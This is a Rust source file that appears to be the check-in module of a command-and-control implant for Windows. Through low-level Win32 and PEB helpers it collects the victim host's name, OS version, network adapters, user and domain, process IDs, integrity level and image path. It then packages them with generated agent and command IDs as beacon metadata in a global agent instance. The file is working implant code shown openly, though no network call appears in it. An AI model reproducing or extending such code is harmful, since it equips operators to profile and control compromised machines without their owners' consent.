use core::ffi::c_void;

use libc_print::libc_println;
use mod_agentcore::instance_mut;
use mod_win32::{
    nt_get_adapters_info::get_adapters_info,
    nt_get_computer_name_ex::{get_computer_name_ex, ComputerNameFormat},
    nt_peb::{get_image_path_name, get_os, get_os_version_info, get_process_name, get_user_domain, get_username},
    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
};
use rs2_communication_protocol::{
    communication_structs::checkin::{Checkin, PartialCheckin},
    metadata::Metadata,
    network_interface::NetworkInterface,
};

use crate::common::utils::generate_request_id;

/// Gathers and initializes metadata such as computer name, OS info, IP addresses, etc.
pub fn initialize_system_data() {
    unsafe {
        // Get the computer name in DNS Hostname format
        let mut buffer = Vec::new();
        let mut size: u32 = 0;
        let success = get_computer_name_ex(
            ComputerNameFormat::ComputerNameDnsHostname,
            &mut buffer,
            &mut size,
        );

        let mut hostname = String::new();
        if success {
            // Convert the computer name to a String
            hostname = String::from_utf16_lossy(&buffer)
                .trim_end_matches('\0')
                .to_string();
        } else {
            libc_println!("[!] get_computer_name_ex failed");
        }

        // Get the operating system information
        let os_info_peb = get_os();
        let get_os_version_info_result = get_os_version_info();
        let mut operating_system = String::new();
        if get_os_version_info_result.is_ok() {
            let os_version_info = get_os_version_info_result.unwrap();

            // Construct the operating system information string
            operating_system.push_str(&format!(
                "{} {}.{}.{} (Platform ID: {})",
                os_info_peb,
                os_version_info.dw_major_version,
                os_version_info.dw_minor_version,
                os_version_info.dw_build_number,
                os_version_info.dw_platform_id,
            ));
        }

        // Get network adapters information
        let network_interfaces = NetworkInterface::from_tuples(get_adapters_info().unwrap());

        // Get the process ID and parent process ID
        let (pid, ppid) = get_pid_and_ppid();

        // Get the integrity level of the process
        let process_handle = -1isize as _;
        let rid = get_process_integrity(process_handle);

        // Create a list of NetworkInterface object from the gathered IP addresses

        // Create a Checkin object with the gathered metadata
        let mut checkin = Box::new(Checkin::new(PartialCheckin {
            operative_system: operating_system,
            hostname,
            domain: get_user_domain(),
            username: get_username(),
            network_interfaces,
            process_id: pid as i64,
            parent_process_id: ppid as i64,
            process_name: get_process_name(),
            integrity_level: rid,
            cwd: get_image_path_name(),
        }));

        // Add metadata to the Checkin object
        let metadata = Metadata {
            request_id: generate_request_id(32),
            command_id: generate_request_id(32),
            agent_id: generate_request_id(32),
            path: None,
        };

        checkin.with_metadata(metadata);

        // Set the Checkin data in the global instance
        instance_mut().set_checkin_data(Box::into_raw(checkin) as *mut c_void);
    }
}

/// Function to retrieve a mutable reference to a Checkin struct from a raw pointer.
pub unsafe fn checkin_from_raw(ptr: *mut c_void) -> &'static mut Checkin { &mut *(ptr as *mut Checkin) }
